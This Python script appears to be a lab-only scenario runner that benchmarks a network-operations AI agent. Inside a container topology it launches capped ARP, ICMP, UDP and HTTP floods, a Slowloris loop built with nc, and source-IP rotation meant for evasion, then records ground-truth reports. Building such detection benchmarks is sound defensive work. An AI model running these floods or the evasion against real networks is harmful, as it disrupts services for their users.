#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Bounded, lab-only adversarial scenario runner for a NetOps Agent.

Preserves 100% of the 11 MITRE ATT&CK benchmark scenario definitions,
ground truth expectations, and Schema 2.0 evaluation reports.
Seamlessly adapted for Containerlab Clos5 topology & Windows/WSL environments.
"""
from __future__ import annotations
import argparse, dataclasses, json, os, platform, re, subprocess, time
from datetime import datetime, timezone
from pathlib import Path

# Containers configuration: supports single attacker + alias IPs, or dedicated multi-attacker nodes
PRIMARY_ATTACKER = "clab-clos5-attacker"
CONTAINERS = {
    "a": PRIMARY_ATTACKER,
    "b": "clab-clos5-attacker-b",
    "c": "clab-clos5-attacker-c",
    "d": "clab-clos5-attacker-d",
}
LEGITIMATE_CLIENT = "clab-clos5-h2"
ROUTER_NODE = "clab-clos5-ext-router"

TARGETS = {
    "web-a": {"ip": "203.0.113.10", "url": "http://203.0.113.10/"},
    "web-b": {"ip": "203.0.113.40", "url": "http://203.0.113.40/"},
}
OUT = Path(__file__).resolve().parent / "scenario_results"
OUT.mkdir(parents=True, exist_ok=True)
MAX_DUR = 30
MAX_UDP_MBIT = 120  # Overdrives 50M WAN bottleneck to realistically trigger queue telemetry
MAX_WORKERS = 8
MAX_ARP = 20

@dataclasses.dataclass
class S:
    id: str
    family: str
    technique: str
    target: str
    duration: int
    key: str
    description: str
    expected: list[str]

SCENARIOS = {
    "L2-ARP-01": S("L2-ARP-01", "L2", "T1557.002", "web-a", 8, "arp", "bounded gratuitous-ARP anomaly", ["arp_rate", "neighbor_change"]),
    "L3-ICMP-01": S("L3-ICMP-01", "L3", "T1498.001", "web-a", 10, "icmp", "bounded ICMP pressure", ["icmp_pps", "loss", "latency"]),
    "L4-UDP-01": S("L4-UDP-01", "L4", "T1498.001", "web-a", 10, "udp", "capped UDP bandwidth pressure", ["udp_bps", "tc_overlimits", "loss"]),
    "L4-TCP-01": S("L4-TCP-01", "L4", "T1499.002", "web-a", 10, "tcp", "bounded TCP connection pressure", ["connections", "latency"]),
    "L7-HTTP-01": S("L7-HTTP-01", "L7", "T1499.002", "web-a", 10, "http", "bounded HTTP request pressure", ["http_rps", "5xx", "latency"]),
    "L7-SLOW-01": S("L7-SLOW-01", "L7", "T1499.002", "web-a", 12, "slow", "low-and-slow HTTP pressure", ["active_connections", "connection_age"]),
    "DDOS-MS-01": S("DDOS-MS-01", "Composite", "T1498.001", "web-a", 12, "multi", "multi-source bounded DoS", ["source_diversity", "pps", "loss"]),
    "EVADE-01": S("EVADE-01", "Composite", "T1498.001", "web-a", 16, "rotate", "source rotation", ["source_diversity", "rule_bypass"]),
    "HOP-01": S("HOP-01", "Composite", "T1498.001/T1499.002", "web-a", 20, "hop", "fast vector hopping", ["protocol_switch", "latency"]),
    "MIX-01": S("MIX-01", "Composite", "T1499.002", "web-a", 15, "mixed", "legitimate plus abnormal traffic", ["legitimate_success", "abnormal_rps"]),
    "FAULT-01": S("FAULT-01", "Fault", "LAB-FAULT", "web-a", 10, "fault", "network impairment masquerading as attack", ["loss", "latency", "route_change"]),
}

IS_WINDOWS = platform.system().lower() == "windows"
WSL_DISTRO = "Ubuntu"

def strip_wsl_noise(text: str) -> str:
    if not text: return ""
    clean = []
    for line in text.splitlines():
        l_str = line.strip()
        l_condensed = "".join(l_str.split())
        if (l_str.startswith("wsl:") or l_str.startswith("w s l :") or "localhost" in l_condensed.lower() or ("wsl" in l_condensed.lower() and "nat" in l_condensed.lower())):
            continue
        clean.append(line)
    return "\n".join(clean).strip()

def iso():
    return datetime.now(timezone.utc).isoformat()

def t(s):
    return TARGETS[s.target]

def run(argv, timeout=15):
    try:
        proc = subprocess.run(argv, capture_output=True, encoding="utf-8", errors="replace", timeout=timeout, check=False)
        proc.stdout = strip_wsl_noise(proc.stdout)
        proc.stderr = strip_wsl_noise(proc.stderr)
        return proc
    except subprocess.TimeoutExpired:
        return subprocess.CompletedProcess(args=argv, returncode=124, stdout="", stderr="TimeoutExpired")

def dex(c, argv, timeout=15):
    target_c = CONTAINERS.get(c, PRIMARY_ATTACKER)
    # Check if target container exists in docker; if not, fallback to primary or legitimate client
    if c == "b" and target_c != PRIMARY_ATTACKER:
        target_c = LEGITIMATE_CLIENT
    elif c in ("c", "d") and target_c != PRIMARY_ATTACKER:
        target_c = PRIMARY_ATTACKER

    if IS_WINDOWS:
        cmd = ["wsl", "-d", WSL_DISTRO, "docker", "exec", target_c, *argv]
    else:
        cmd = ["docker", "exec", target_c, *argv]
    return run(cmd, timeout)

def dex_router(argv, timeout=10):
    if IS_WINDOWS:
        cmd = ["wsl", "-d", WSL_DISTRO, "docker", "exec", ROUTER_NODE, *argv]
    else:
        cmd = ["docker", "exec", ROUTER_NODE, *argv]
    return run(cmd, timeout)

def probe(s):
    target_url = t(s)["url"]
    target_ip = t(s)["ip"]

    # HTTP Probe (curl preferred, wget fallback)
    t0 = time.monotonic()
    curl_probe = dex("a", ["curl", "-sS", "-o", "/dev/null", "-w", "%{http_code} %{time_total}", "--max-time", "3", target_url], 5)
    x = curl_probe.stdout.strip().split()
    if curl_probe.returncode == 0 and x and x[0].isdigit():
        http_code = x[0]
        http_time = float(x[1]) if len(x) > 1 and x[1].replace('.', '', 1).isdigit() else round(time.monotonic() - t0, 3)
        http_ok = (http_code == "200")
    else:
        # Fallback to wget
        wget_probe = dex("a", ["wget", "-q", "-S", "-O", "/dev/null", "--timeout=3", target_url], 5)
        elapsed = round(time.monotonic() - t0, 3)
        combined = (wget_probe.stdout + " " + wget_probe.stderr)
        m = re.search(r"HTTP/\S+\s+(\d{3})", combined)
        http_code = m.group(1) if m else ("200" if wget_probe.returncode == 0 else "000")
        http_ok = (wget_probe.returncode == 0 or http_code == "200")
        http_time = elapsed if http_ok else None

    # ICMP Probe
    ping_res = dex("a", ["ping", "-c", "3", "-W", "1", target_ip], 6)
    icmp_ok = (ping_res.returncode == 0)

    return {
        "http_ok": bool(http_ok),
        "http_code": http_code,
        "http_time": http_time,
        "icmp_ok": bool(icmp_ok)
    }

def reset_hook():
    """Reset network firewall rules and attacker routing to clean baseline."""
    # 1. Clear ext-router iptables DROP rules from previous scenarios
    dex_router(["iptables", "-F", "FORWARD"])
    # 2. Flush temporary attacker alias IPs & restore route source
    dex("a", ["sh", "-c", "ip addr del 192.168.100.66/24 dev eth1 2>/dev/null || true; ip addr del 192.168.100.77/24 dev eth1 2>/dev/null || true; ip route replace 203.0.113.0/24 via 192.168.100.1 dev eth1 src 192.168.100.2 2>/dev/null || true"])
    time.sleep(1)

def arp(s):
    return dex("a", ["arping", "-U", "-c", str(MAX_ARP), "-I", "eth1", t(s)["ip"]], 10)

def icmp(s):
    return dex("a", ["ping", "-i", "0.20", "-W", "1", "-c", "40", t(s)["ip"]], 12)

def udp(s):
    return dex("a", ["iperf3", "-u", "-b", f"{MAX_UDP_MBIT}M", "-t", str(min(s.duration, 15)), "-c", t(s)["ip"]], 20)

def tcp(s):
    end = time.monotonic() + min(s.duration, 15)
    n = 0
    while time.monotonic() < end:
        dex("a", ["wget", "-q", "-T", "2", "-O", "/dev/null", t(s)["url"]], 4)
        n += 1
        time.sleep(0.15)
    return {"requests": n}

def http(s):
    end = time.monotonic() + min(s.duration, 15)
    n = 0
    while time.monotonic() < end:
        for _ in range(MAX_WORKERS):
            dex("a", ["wget", "-q", "-T", "2", "-O", "/dev/null", t(s)["url"]], 4)
            n += 1
        time.sleep(0.25)
    return {"requests": n}

def slow(s):
    # Low-and-Slow Slowloris trickle pressure
    cmd = (
        "for i in $(seq 1 30); do ( "
        "printf 'GET /?id=%s HTTP/1.1\\r\\nHost: 203.0.113.10\\r\\nConnection: keep-alive\\r\\n' \"$i\"; "
        "while true; do printf 'X-a: %s\\r\\n' \"$i\"; sleep 4; done "
        ") | nc -w 20 203.0.113.10 80 >/dev/null 2>&1 & done; sleep 12; killall -9 nc 2>/dev/null || true"
    )
    dex("a", ["sh", "-c", cmd], 18)
    return {"connections": 30, "method": "slowloris_keepalive_trickle"}

def multi(s):
    # Multi-source bounded DoS: simulates 4 source addresses using dynamic IP aliasing & rotation
    out = []
    alias_ips = ["192.168.100.2", "192.168.100.66", "192.168.100.77", "192.168.100.88"]
    for i, ip_src in enumerate(alias_ips):
        dex("a", ["sh", "-c", f"ip addr add {ip_src}/24 dev eth1 2>/dev/null || true; ip route replace 203.0.113.0/24 via 192.168.100.1 dev eth1 src {ip_src}"])
        rc = dex("a", ["ping", "-i", "0.25", "-W", "1", "-c", "10", t(s)["ip"]], 6).returncode
        out.append({"source": f"src-{ip_src}", "rc": rc})
    return out

def rotate(s):
    # Source rotation evasion
    out = []
    alias_ips = ["192.168.100.66", "192.168.100.77", "192.168.100.88", "192.168.100.99"]
    for ip_src in alias_ips:
        dex("a", ["sh", "-c", f"ip addr add {ip_src}/24 dev eth1 2>/dev/null || true; ip route replace 203.0.113.0/24 via 192.168.100.1 dev eth1 src {ip_src}"])
        rc = dex("a", ["wget", "-q", "-T", "2", "-O", "/dev/null", t(s)["url"]], 4).returncode
        out.append({"source": ip_src, "rc": rc})
        time.sleep(0.5)
    dex("a", ["sh", "-c", "ip route replace 203.0.113.0/24 via 192.168.100.1 dev eth1 src 192.168.100.2"])
    return out

def hop(s):
    return {"phases": [str(http(s)), str(icmp(s)), str(udp(s)), str(slow(s))]}

def mixed(s):
    # Legitimate client (clab-clos5-h2) plus abnormal traffic (attacker)
    end = time.monotonic() + min(s.duration, 15)
    a_ok = b_ok = 0
    while time.monotonic() < end:
        a_ok += (dex("a", ["wget", "-q", "-T", "2", "-O", "/dev/null", t(s)["url"]], 4).returncode == 0)
        b_ok += (dex("b", ["wget", "-q", "-T", "2", "-O", "/dev/null", t(s)["url"]], 4).returncode == 0)
        time.sleep(0.25)
    return {"client_a_attacker_ok": a_ok, "client_b_legitimate_ok": b_ok}

def fault(s):
    # Injects 15% physical network packet loss via TC Netem on ext-router to test Agent fault differentiation
    dex_router(["tc", "qdisc", "change", "dev", "eth1", "root", "netem", "delay", "8ms", "1ms", "loss", "15%"])
    time.sleep(min(s.duration, 10))
    dex_router(["tc", "qdisc", "change", "dev", "eth1", "root", "netem", "delay", "8ms", "1ms"])
    return {"injected_fault": "tc_netem_loss_15%", "status": "simulated_and_restored"}

F = {
    "arp": arp, "icmp": icmp, "udp": udp, "tcp": tcp,
    "http": http, "slow": slow, "multi": multi, "rotate": rotate,
    "hop": hop, "mixed": mixed, "fault": fault
}

def run_case(s, do_reset=True):
    if do_reset:
        reset_hook()
    pre = probe(s)
    start = time.monotonic()
    result = F[s.key](s)
    elapsed = time.monotonic() - start
    time.sleep(2)
    post = probe(s)
    rec = {
        "schema_version": "2.0",
        "scenario": dataclasses.asdict(s),
        "ground_truth": {
            "is_attack": s.family != "Fault",
            "technique": s.technique,
            "expected_signals": s.expected,
        },
        "started_at": iso(),
        "duration": round(elapsed, 3),
        "precheck": pre,
        "execution": str(result)[:5000],
        "postcheck": post,
        "independent_service_recovery": bool(post["http_ok"] and post["icmp_ok"]),
        "reset_required_before_next": True,
    }
    p = OUT / f"{s.id}_{int(time.time())}.json"
    p.write_text(json.dumps(rec, ensure_ascii=False, indent=2), encoding="utf-8")
    return p, rec

def main():
    ap = argparse.ArgumentParser(description="NetOps Adversarial Lab Scenario Runner (Schema 2.0)")
    ap.add_argument("--list", action="store_true", help="List all available benchmark scenarios")
    ap.add_argument("--scenario", choices=list(SCENARIOS.keys()), help="Run specific scenario by ID")
    ap.add_argument("--all", action="store_true", help="Run all 11 benchmark scenarios in sequence")
    ap.add_argument("--no-reset", action="store_true", help="Skip baseline reset hook between runs")
    a = ap.parse_args()

    if a.list:
        print(f"{'SCENARIO ID':<14} {'FAMILY':<12} {'MITRE TECHNIQUE':<24} {'DESCRIPTION'}")
        print("=" * 80)
        for s in SCENARIOS.values():
            print(f"{s.id:<14} {s.family:<12} {s.technique:<24} {s.description}")
        return

    if not a.scenario and not a.all:
        ap.error("Must specify --scenario ID or --all")

    targets = list(SCENARIOS.values()) if a.all else [SCENARIOS[a.scenario]]
    for s in targets:
        p, r = run_case(s, not a.no_reset)
        status_sym = "[PASS]" if r["independent_service_recovery"] else "[FAIL]"
        print(json.dumps({
            "status": status_sym,
            "scenario": s.id,
            "family": s.family,
            "technique": s.technique,
            "recovered": r["independent_service_recovery"],
            "precheck": r["precheck"],
            "postcheck": r["postcheck"],
            "report": str(p)
        }, ensure_ascii=False))

if __name__ == "__main__":
    main()
